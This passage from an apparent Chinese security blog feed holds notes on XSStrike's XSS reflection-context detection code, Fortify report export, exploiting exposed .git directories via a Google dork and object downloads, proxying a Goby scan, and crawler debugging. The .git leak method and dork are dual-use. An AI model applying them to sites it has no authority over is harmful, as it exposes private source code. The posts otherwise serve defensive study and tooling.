<li><code>context</code>: 输出位置点的执行环境(<code>script</code>,<code>attribute</code>,<code>html</code>,<code>comment</code>等)</li>
<li><code>details</code>: 执行环境的具体信息<ul>
<li><code>tag</code>: 输出点在什么标签(<code>div</code>,<code>a</code>,<code>input</code>等)</li>
<li><code>type</code>: 输出点是参数名还是参数值(<code>name</code>, <code>value</code>)</li>
<li><code>quote</code>: 输出点是用什么包裹起来的(单引号,双引号,&#96;号)</li>
<li><code>value</code>: 参数值</li>
<li><code>name</code>: 参数名</li>
</ul>
</li>
</ul>
<hr>
<h3 id="输出点在script标签中"><a href="#输出点在script标签中" class="headerlink" title="输出点在script标签中:"></a>输出点在script标签中:</h3><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例:"></a>示例:</h4><p><img src="https://i.loli.net/2019/07/26/5d3a726768a9a13593.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(reflections):  <span class="comment"># 遍历输出点</span></span><br><span class="line">    occurence = re.search(<span class="string">r&#x27;(?i)(?s)&lt;script[^&gt;]*&gt;.*?(%s).*?&lt;/script&gt;&#x27;</span> % xsschecker, script_checkable)</span><br><span class="line">    <span class="comment"># 1.判断xsschecker是否在script标签对里面</span></span><br><span class="line">    <span class="keyword">if</span> occurence:</span><br><span class="line">        thisPosition = occurence.start(<span class="number">1</span>) <span class="comment"># Return the index of the start of the substring matched by group.</span></span><br><span class="line">        <span class="comment"># 2.返回注入点在返回包原文的位置</span></span><br><span class="line">        position_and_context[thisPosition] = <span class="string">&#x27;script&#x27;</span>  <span class="comment"># script标签</span></span><br><span class="line">        environment_details[thisPosition] = &#123;&#125;</span><br><span class="line">        environment_details[thisPosition][<span class="string">&#x27;details&#x27;</span>] = &#123;<span class="string">&#x27;quote&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;￥￥￥￥￥￥￥￥￥￥￥&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(occurence.group())  <span class="comment"># eq: &lt;script&gt;v3dm0s&lt;/script&gt;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;￥￥￥￥￥￥￥￥￥￥￥&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(occurence.group())):   <span class="comment"># eq: &lt;script&gt;v3dm0s&lt;/script&gt; 3.遍历每一个字符 判断输出点是由什么包裹起来的</span></span><br><span class="line">            currentChar = occurence.group()[i]</span><br><span class="line">            <span class="keyword">if</span> currentChar <span class="keyword">in</span> (<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> escaped(i, occurence.group()):  <span class="comment">#  在(单引号,双引号,顿号)里  且未被转义</span></span><br><span class="line">                environment_details[thisPosition][<span class="string">&#x27;details&#x27;</span>][<span class="string">&#x27;quote&#x27;</span>] = currentChar</span><br><span class="line">            <span class="keyword">elif</span> currentChar <span class="keyword">in</span> (<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> escaped(i, occurence.group()):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        script_checkable = script_checkable.replace(xsschecker, <span class="string">&#x27;&#x27;</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h4><p>主要做的就是:</p>
<ol>
<li>判断输出点是否在script标签对里面</li>
<li>返回输出点在返回包原文的位置</li>
<li>判断输出点是用什么包裹起来的(单引号,双引号,&#96;号)</li>
</ol>
<hr>
<h3 id="输出点在属性中"><a href="#输出点在属性中" class="headerlink" title="输出点在属性中:"></a>输出点在属性中:</h3><h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例:"></a>示例:</h4><p><img src="https://i.loli.net/2019/07/16/5d2ca3e0cec2634464.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(position_and_context) &lt; reflections:</span><br><span class="line">    attribute_context = re.finditer(<span class="string">r&#x27;&lt;[^&gt;]*?(%s)[^&gt;]*?&gt;&#x27;</span> % xsschecker, clean_response) <span class="comment"># 1.找出xsschecker所在的标签</span></span><br><span class="line">    <span class="keyword">for</span> occurence <span class="keyword">in</span> attribute_context:</span><br><span class="line">        match = occurence.group(<span class="number">0</span>) <span class="comment"># eq: match: &#x27;&lt;input name=keyword  value=&quot;v3dm0s&quot;&gt;&#x27;</span></span><br><span class="line">        thisPosition = occurence.start(<span class="number">1</span>)</span><br><span class="line">        parts = re.split(<span class="string">r&#x27;\s&#x27;</span>, match) <span class="comment"># eq: parts: &#x27;&lt;class &#x27;list&#x27;&gt;: [&#x27;&lt;input&#x27;, &#x27;name=keyword&#x27;, &#x27;&#x27;, &#x27;value=&quot;v3dm0s&quot;&gt;&#x27;]&#x27;</span></span><br><span class="line">        tag = parts[<span class="number">0</span>][<span class="number">1</span>:] <span class="comment"># tag: &#x27;input&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> part <span class="keyword">in</span> parts:</span><br><span class="line">            <span class="keyword">if</span> xsschecker <span class="keyword">in</span> part: <span class="comment"># xsschecker参数所在的部分</span></span><br><span class="line">                <span class="type">Type</span>, quote, name, value = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">in</span> part:</span><br><span class="line">                    quote = re.search(<span class="string">r&#x27;=([\&#x27;`&quot;])?&#x27;</span>, part).group(<span class="number">1</span>) <span class="comment"># 由什么包裹</span></span><br><span class="line">                    name_and_value = part.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>], <span class="string">&#x27;=&#x27;</span>.join(part.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>:])</span><br><span class="line">                    <span class="keyword">if</span> xsschecker == name_and_value[<span class="number">0</span>]: <span class="comment"># 注入点的类型是什么?</span></span><br><span class="line">                        <span class="type">Type</span> = <span class="string">&#x27;name&#x27;</span> <span class="comment"># 注入点的类型是参数名</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="type">Type</span> = <span class="string">&#x27;value&#x27;</span> <span class="comment"># 注入点的类型是参数值</span></span><br><span class="line">                    name = name_and_value[<span class="number">0</span>]</span><br><span class="line">                    value = name_and_value[<span class="number">1</span>].rstrip(<span class="string">&#x27;&gt;&#x27;</span>).rstrip(quote).lstrip(quote)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="type">Type</span> = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">                position_and_context[thisPosition] = <span class="string">&#x27;attribute&#x27;</span>  <span class="comment"># 属性</span></span><br><span class="line">                environment_details[thisPosition] = &#123;&#125;</span><br><span class="line">                environment_details[thisPosition][<span class="string">&#x27;details&#x27;</span>] = &#123;<span class="string">&#x27;tag&#x27;</span>: tag, <span class="string">&#x27;type&#x27;</span>: <span class="type">Type</span>, <span class="string">&#x27;quote&#x27;</span>: quote,</span><br><span class="line">                                                                <span class="string">&#x27;value&#x27;</span>: value, <span class="string">&#x27;name&#x27;</span>: name&#125;</span><br><span class="line">                <span class="comment"># eq: &#123;&#x27;details&#x27;: &#123;&#x27;tag&#x27;: &#x27;input&#x27;, &#x27;type&#x27;: &#x27;value&#x27;, &#x27;quote&#x27;: &#x27;&quot;&#x27;, &#x27;value&#x27;: &#x27;v3dm0s&#x27;, &#x27;name&#x27;: &#x27;value&#x27;&#125;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结:"></a>小结:</h4><p>主要做的就是:</p>
<ol>
<li>判断输出点是否在标签里面,找出xsschecker所在的标签  如<code>&lt;input name=keyword  value=&quot;v3dm0s&quot;&gt;</code></li>
<li>遍历标签 如 <code>[&#39;&lt;input&#39;, &#39;name=keyword&#39;, &#39;&#39;, &#39;value=&quot;v3dm0s&quot;&gt;&#39;]&#39;</code></li>
<li>找出输出点的环境信息:<ul>
<li>是在什么标签里 (如<code>input</code>)</li>
<li>由什么符号包裹 (单引号、双引号、顿号)</li>
<li>输出点的类型是什么?(参数名or参数值)</li>
</ul>
</li>
</ol>
<hr>
<h3 id="输出点在html中"><a href="#输出点在html中" class="headerlink" title="输出点在html中:"></a>输出点在html中:</h3><p>示例:</p>
<p><img src="https://i.loli.net/2019/07/14/5d2b3c73d09d963919.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(position_and_context) &lt; reflections:</span><br><span class="line">    html_context = re.finditer(xsschecker, clean_response)</span><br><span class="line">    <span class="keyword">for</span> occurence <span class="keyword">in</span> html_context:</span><br><span class="line">        thisPosition = occurence.start()</span><br><span class="line">        <span class="keyword">if</span> thisPosition <span class="keyword">not</span> <span class="keyword">in</span> position_and_context:</span><br><span class="line">            position_and_context[occurence.start()] = <span class="string">&#x27;html&#x27;</span> <span class="comment"># html</span></span><br><span class="line">            environment_details[thisPosition] = &#123;&#125;</span><br><span class="line">            environment_details[thisPosition][<span class="string">&#x27;details&#x27;</span>] = &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>无过多处理,就是个正则匹配</p>
<hr>
<h3 id="输出点在注释中"><a href="#输出点在注释中" class="headerlink" title="输出点在注释中:"></a>输出点在注释中:</h3><p>示例:</p>
<p>无</p>
<p>源码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(position_and_context) &lt; reflections:</span><br><span class="line">    comment_context = re.finditer(<span class="string">r&#x27;&lt;!--(?![.\s\S]*--&gt;)[.\s\S]*(%s)[.\s\S]*?--&gt;&#x27;</span> % xsschecker, response)</span><br><span class="line">    <span class="keyword">for</span> occurence <span class="keyword">in</span> comment_context:</span><br><span class="line">        thisPosition = occurence.start(<span class="number">1</span>)</span><br><span class="line">        position_and_context[thisPosition] = <span class="string">&#x27;comment&#x27;</span>  <span class="comment"># 注释</span></span><br><span class="line">        environment_details[thisPosition] = &#123;&#125;</span><br><span class="line">        environment_details[thisPosition][<span class="string">&#x27;details&#x27;</span>] = &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>无过多处理,就是个正则匹配</p>
<hr>
<h3 id="标记无法执行的环境"><a href="#标记无法执行的环境" class="headerlink" title="标记无法执行的环境:"></a>标记无法执行的环境:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bad_contexts = re.finditer(</span><br><span class="line">    <span class="string">r&#x27;(?s)(?i)&lt;(style|template|textarea|title|noembed|noscript)&gt;[.\s\S]*(%s)[.\s\S]*&lt;/\1&gt;&#x27;</span> % xsschecker, response) <span class="comment"># 正则匹配 标记无法执行的输出</span></span><br><span class="line">non_executable_contexts = []</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> bad_contexts:</span><br><span class="line">    non_executable_contexts.append([each.start(), each.end(), each.group(<span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> non_executable_contexts:</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> database.keys():</span><br><span class="line">        position = database[key][<span class="string">&#x27;position&#x27;</span>]</span><br><span class="line">        badTag = isBadContext(position, non_executable_contexts)</span><br><span class="line">        <span class="keyword">if</span> badTag:</span><br><span class="line">            database[key][<span class="string">&#x27;details&#x27;</span>][<span class="string">&#x27;badTag&#x27;</span>] = badTag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            database[key][<span class="string">&#x27;details&#x27;</span>][<span class="string">&#x27;badTag&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">return</span> database</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在以下标签内,为不可执行的环境.</p>
<ul>
<li><code>style</code></li>
<li><code>template</code></li>
<li><code>textarea</code></li>
<li><code>title</code></li>
<li><code>noembed</code></li>
<li><code>noscript</code></li>
</ul>
<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><ul>
<li>解析请求参数(前提)</li>
<li>对参数值进行无害字符串替换,发包</li>
<li>在返回包源码中搜索输出点</li>
<li>标记输出点的上下文环境</li>
</ul>
<p>上下文环境实例:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="number">455</span>: &#123;<span class="string">&#x27;position&#x27;</span>: <span class="number">455</span>, <span class="string">&#x27;context&#x27;</span>: <span class="string">&#x27;attribute&#x27;</span>, <span class="string">&#x27;details&#x27;</span>: &#123;<span class="string">&#x27;tag&#x27;</span>: <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;quote&#x27;</span>: <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;v3dm0s&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;value&#x27;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>position</code>:表示输出点在页面中的第几个字符处</li>
<li><code>context</code>: 输出位置点的执行环境(<code>script</code>,<code>attribute</code>,<code>html</code>,<code>comment</code>等)</li>
<li><code>details</code>: 执行环境的具体信息<ul>
<li><code>tag</code>: 输出点在什么标签(<code>div</code>,<code>a</code>,<code>input</code>等)</li>
<li><code>type</code>: 输出点是参数名还是参数值(<code>name</code>, <code>value</code>)</li>
<li><code>quote</code>: 输出点是用什么包裹起来的(单引号,双引号,&#96;号)</li>
<li><code>value</code>: 参数值</li>
<li><code>name</code>: 参数名</li>
</ul>
</li>
</ul>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://juejin.im/entry/58f43b0c61ff4b0058fd734d">跨站的艺术 - XSS Fuzzing 的技巧</a></li>
<li><a href="https://www.freebuf.com/articles/web/191003.html">利用XSStrike Fuzzing XSS漏洞</a></li>
<li><a href="https://blog.csdn.net/he_and/article/details/84593067">XSStrike源码阅读（1）——目录结构与大体架构</a></li>
<li><a href="https://blog.csdn.net/he_and/article/details/84660755">XSStrike源码阅读（2）——四种模式</a></li>
<li><a href="https://blog.csdn.net/he_and/article/details/84886282">XSStrike源码阅读（3）——核心函数</a></li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>fortify结果解析</title>
    <url>//50872.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>Goal:使用<code>fortify</code>扫描完后,需要导出并解析它的结果。</p>
<hr>
<h1 id="工具ReportGenerator"><a href="#工具ReportGenerator" class="headerlink" title="工具ReportGenerator:"></a>工具ReportGenerator:</h1><p><code>ReportGenerator.bat</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200727143418.png" alt="20200727143418"></p>
<p>使用该工具可以设置模板、导出指定格式的报告.</p>
<p>任务参数:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200727143603.png" alt="20200727143603"></p>
<p>解析有3种格式:</p>
<ul>
<li>pdf</li>
<li>rtf</li>
<li>xml</li>
</ul>
<p>此处,我选了xml的格式。</p>
<hr>
<h1 id="xml解析"><a href="#xml解析" class="headerlink" title="xml解析:"></a>xml解析:</h1><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200721102113.png" alt="20200721102113"></p>
<p>整体分成3部分:</p>
<ul>
<li>Report Overview 报告总览<ul>
<li>Report Summary 报告摘要</li>
<li>Issue Summary by Fortify Priority Order 问题摘要(根据优先级排序)</li>
</ul>
</li>
<li>Issue Summary 问题摘要<ul>
<li>Overall number of results 结果总数</li>
<li>Issues By Category 类别问题</li>
</ul>
</li>
<li>Results Outline 结果概要<ul>
<li>Vulnerability Examples by Category 按类别列出的漏洞示例</li>
</ul>
</li>
</ul>
<hr>
<h1 id="第一部分-Report-Overview报告总览"><a href="#第一部分-Report-Overview报告总览" class="headerlink" title="第一部分-Report Overview报告总览:"></a>第一部分-Report Overview报告总览:</h1><h2 id="Report-Summary-报告摘要"><a href="#Report-Summary-报告摘要" class="headerlink" title="Report Summary 报告摘要"></a>Report Summary 报告摘要</h2><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200721102635.png" alt="20200721102635"></p>
<p>对应于</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200721104903.png" alt="20200721104903"></p>
<h2 id="Issue-Summary-by-Fortify-Priority-Order-问题摘要-根据优先级排序"><a href="#Issue-Summary-by-Fortify-Priority-Order-问题摘要-根据优先级排序" class="headerlink" title="Issue Summary by Fortify Priority Order 问题摘要(根据优先级排序)"></a>Issue Summary by Fortify Priority Order 问题摘要(根据优先级排序)</h2><p>每个级别的统计数据</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200721103449.png" alt="20200721103449"></p>
<p>filter set选择<code>Security Auditor View</code>后,对应于<code>Audit Workbench</code>这里的数据</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200721103529.png" alt="20200721103529"></p>
<hr>
<h1 id="第二部分-Issue-Summary问题摘要"><a href="#第二部分-Issue-Summary问题摘要" class="headerlink" title="第二部分-Issue Summary问题摘要:"></a>第二部分-Issue Summary问题摘要:</h1><h2 id="Overall-number-of-results结果总数"><a href="#Overall-number-of-results结果总数" class="headerlink" title="Overall number of results结果总数:"></a>Overall number of results结果总数:</h2><p>问题总数<br><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200721105039.png" alt="20200721105039"></p>
<p>对应于</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200727144734.png" alt="20200727144734"></p>
<hr>
<h2 id="Issues-By-Category类别问题"><a href="#Issues-By-Category类别问题" class="headerlink" title="Issues By Category类别问题:"></a>Issues By Category类别问题:</h2><p>问题分类统计</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200721105254.png" alt="20200721105254"></p>
<p>对应于</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200721105400.png" alt="20200721105400"></p>
<hr>
<h1 id="第三部分-Results-Outline-结果概要"><a href="#第三部分-Results-Outline-结果概要" class="headerlink" title="第三部分:Results Outline 结果概要"></a>第三部分:Results Outline 结果概要</h1><p>Vulnerability Examples by Category 按类别列出的漏洞示例</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200727144915.png" alt="20200727144915"></p>
<p>对应于:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200727145912.png" alt="20200727145912"></p>
<hr>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他:"></a>其他:</h1><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200727143959.png" alt="20200727143959"></p>
<p>默认的模板对列出的风险有个数的限制,我们要自定义模板，才可以导出所有的风险。</p>
<p>做法可参考<a href="https://stackoverflow.com/questions/33288065/how-do-i-generate-a-report-that-has-all-the-issues">how-do-i-generate-a-report-that-has-all-the-issues</a></p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li>HPE_SCA_Guide_17.20.pdf</li>
<li><a href="https://stackoverflow.com/questions/33288065/how-do-i-generate-a-report-that-has-all-the-issues">how-do-i-generate-a-report-that-has-all-the-issues</a></li>
<li><a href="https://github.com/yingshang/banruo">banruo</a></li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>git源码泄露exploit</title>
    <url>//30513.html</url>
    <content><![CDATA[<h1 id="gitHack工作原理"><a href="#gitHack工作原理" class="headerlink" title="gitHack工作原理:"></a>gitHack工作原理:</h1><h2 id="寻找测试目标"><a href="#寻找测试目标" class="headerlink" title="寻找测试目标:"></a>寻找测试目标:</h2><p>google hack <code>&quot;index of /.git&quot;</code></p>
<h2 id="解析元数据"><a href="#解析元数据" class="headerlink" title="解析元数据:"></a>解析元数据:</h2><p><code>/.git/index</code>的作用:</p>
<blockquote>
<p>The index is a single, large, binary file in <baseOfRepo>&#x2F;.git&#x2F;index, which lists all files in the current branch, their sha1 checksums, time stamps and the file name</p>
</blockquote>
<p>通过<code>gin</code>这个工具去解析index文件</p>
<p>解析结果:</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d70f29f95.jpg"></p>
<h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件:"></a>下载文件:</h2><p>通过上面获得的<code>sha1</code>来构造url:</p>
<p>.git&#x2F;objects&#x2F;<code>sha前两位</code>&#x2F;<code>sha后两位之后的内容</code></p>
<p>对返回的数据进行<code>zlib</code>解压就可以下载到文件了</p>
<h1 id="危害"><a href="#危害" class="headerlink" title="危害:"></a>危害:</h1><ul>
<li><a href="https://threatpost.com/open-git-directories-leave-390k-websites-vulnerable/137299/">Open .Git Directories Leave 390K Websites Vulnerable</a></li>
</ul>
<h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案:"></a>修复方案:</h1><p>对<code>.git</code>目录限制,不对外访问</p>
<h1 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因:"></a>漏洞原因:</h1><p>开发人员通常会使用版本控制工具来管理代码,在上线的服务器上的根目录上使用简单的git操作就可以很方便的更新、管理代码。</p>
<p>版本控制工具在带来便利的同时,由于开发人员的疏忽,导致出现源代码安全的问题</p>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://github.com/lijiejie/GitHack">GitHack</a></li>
<li><a href="https://www.jianshu.com/p/edae09535ea3">如何利用.git文件夹下载整个网站泄漏的源码</a></li>
<li><a href="https://threatpost.com/open-git-directories-leave-390k-websites-vulnerable/137299/">Open .Git Directories Leave 390K Websites Vulnerable</a></li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>goby配置socks5代理进行扫描</title>
    <url>//35805.html</url>
    <content><![CDATA[<h1 id="pre"><a href="#pre" class="headerlink" title="pre:"></a>pre:</h1><p>需求:需要从办公网和测试网段出发，去扫描生产的es 9200端口,看是否有未授权访问的问题</p>
<p>为了方便，打算通过配置代理的方式，用办公机去进行扫描</p>
<hr>
<h1 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理:"></a>配置代理:</h1><p>在一台测试网段的服务器上,确认了80端口是和我的办公网电脑通的。</p>
<p>利用该端口进行代理</p>
<hr>
<h2 id="socks5服务端配置"><a href="#socks5服务端配置" class="headerlink" title="socks5服务端配置:"></a>socks5服务端配置:</h2><p>在服务端上配置socks5服务端:</p>
<p><a href="https://github.com/woodyxiong/TinySocks5">TinySocks5</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python main.py -p 80</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="goby配置"><a href="#goby配置" class="headerlink" title="goby配置:"></a>goby配置:</h2><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201112112541.png" alt="20201112112541"></p>
<p>然后就可以进行扫描了</p>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>nyawc框架-解析不了网页里的链接的分析</title>
    <url>//40639.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>用<code>nyawc</code>框架,试图爬取该url<code>http://atmos.sysu.edu.cn/</code>里的文档类型链接的时候,发现爬取不到.</p>
<p>比如</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d712ac5eb.jpg"></p>
<p>通过<code>python</code>模拟发包请求该url<code>http://atmos.sysu.edu.cn/article/2005</code></p>
<p>发现返回包里没有<code>doc</code>链接.</p>
<hr>
<h1 id="Debug思路1"><a href="#Debug思路1" class="headerlink" title="Debug思路1:"></a>Debug思路1:</h1><p>猜测: <code>nyawc</code>处理不了无后缀的url(eg.<code>http://atmos.sysu.edu.cn/article/2005</code>)</p>
<p>该网站可能是隐藏了网页的后缀.也就是对url进行了重写即<code>url rewrite</code></p>
<hr>
<h2 id="URL重写"><a href="#URL重写" class="headerlink" title="URL重写:"></a>URL重写:</h2><h2 id="什么是URL重写"><a href="#什么是URL重写" class="headerlink" title="什么是URL重写"></a>什么是URL重写</h2><p>如果您正在给银行写信，您可能会打开文字处理程序并创建一个名为的文件<code>lettertobank.doc</code>。该文件可能位于您的Documents目录中，其中包含完整路径<code>C:/Windows/users/julie/Documents/lettertobank.doc</code>。一个文件路径&#x3D;一个文档(<strong><code>One file path = one document</code></strong>).</p>
<p>同样，如果您要创建一个银行网站，您可以创建一个名为的页面page1.html，上传它，然后将浏览器指向。一个URL &#x3D;一个资源(<strong><code>One URL = one resource</code></strong>)。在这种情况下，资源是物理网页，但它也可以是从CMS中提取的页面或产品。</p>
<p>URL重写会改变这一切。它允许您将URL与资源完全分开。</p>
<p>通过URL重写，您可以将用户带到<code>…/page1.html</code>或去<code>…/about-us/</code>或去<code>…/about-this-website-and-me/</code>或去<code>…/youll-never-find-out-about-me-hahaha-Xy2834/</code>。或者所有这些。它有点像硬盘上的快捷方式或符号链接。一个URL &#x3D;查找资源的一种方法(<strong><code>One URL = one way to find a resource.</code></strong>)。</p>
<p><strong>通过URL重写，URL和它所引导的资源可以完全相互独立</strong>。</p>
<p>实际上，它们通常不是完全独立的：URL通常包含一些代码或数字或名称，使CMS能够查找资源。但从理论上讲，这就是URL重写所提供的：<strong>完全分离</strong>。</p>
<hr>
<h3 id="为什么要重写URL"><a href="#为什么要重写URL" class="headerlink" title="为什么要重写URL:"></a>为什么要重写URL:</h3><p>对于网站来说:</p>
<ul>
<li>隐藏网站实现细节</li>
<li>有利于<code>SEO</code>,复杂的url地址会对网页的收录造成影响</li>
</ul>
<p>例如:<code>http://www.prof…co.uk/products/brown-miniflo-gutter-148/</code>,URL本身包含搜索词中的单词.</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d713de4f8.jpg"></p>
<p>对于用户来说:</p>
<ul>
<li>让url看起来更简洁、更容易输入和记住</li>
</ul>
<hr>
<h3 id="如何重写URL"><a href="#如何重写URL" class="headerlink" title="如何重写URL:"></a>如何重写URL:</h3><p>是否可以在网站上实现URL重写主要取决于Web服务器</p>
<p>几乎所有服务器都支持,比如</p>
<ul>
<li><code>Java</code>可以通过<code>web.xml</code>配置</li>
<li><code>PHP</code>可以通过模板引擎配置</li>
<li><code>Apache</code> 有专门的 <code>module</code> 等等</li>
</ul>
<hr>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子:"></a>例子:</h4><p>通过<code>Apache</code>配置的例子:</p>
<ol>
<li><p>开启<code>apache</code> <code>Rewrite_mod</code>模块。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure>
</li>
<li><p>在配置文件末尾添加虚拟主机配置</p>
</li>
<li><p>新建<code>.htaccess</code>文件,添加规则</p>
<p> eg1:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RewriteRule ^([a-zA-Z]+)\/([a-zA-Z0-9]+)\.shtml$ $1.php?id=$2 [L]</span><br></pre></td></tr></table></figure>

<p> <code>http://www.test.test/test/3.shtml</code> 对应实际的Url地址为：<code>http://www.test.test/test.php?id=3</code></p>
<p> eg2:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RewriteRule ^room_(.*)$ room.php?id=$1 [NC]</span><br></pre></td></tr></table></figure>
<p> <code>http://localhost/room_123/</code> 对应的Url地址为: <code>http://localhost/room.php?id=123</code></p>
</li>
</ol>
<hr>
<h1 id="Debug思路2"><a href="#Debug思路2" class="headerlink" title="Debug思路2:"></a>Debug思路2:</h1><p>抓包分析,比较浏览器请求的包与用<code>python</code>模拟发的包.</p>
<hr>
<h2 id="浏览器抓包的实际请求"><a href="#浏览器抓包的实际请求" class="headerlink" title="浏览器抓包的实际请求:"></a>浏览器抓包的实际请求:</h2><p><img src="https://i.loli.net/2019/04/25/5cc1d71524169.jpg"></p>
<p>在获取我们需要的内容(第三个包)前,必须执行一个js请求.</p>
<hr>
<h2 id="模拟发的包"><a href="#模拟发的包" class="headerlink" title="模拟发的包:"></a>模拟发的包:</h2><p>发现第一个包的请求的状态码是<code>202</code>,也就是上面图的第一个包.</p>
<hr>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论:"></a>结论:</h2><p>这种要执行js请求才能获取得到的返回包,一般要使用无头浏览器才能解决得了.</p>
<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因:"></a>原因:</h2><p>这个问题是 <strong>发送了正确的请求,但是没有获得正确的返回结果</strong>.</p>
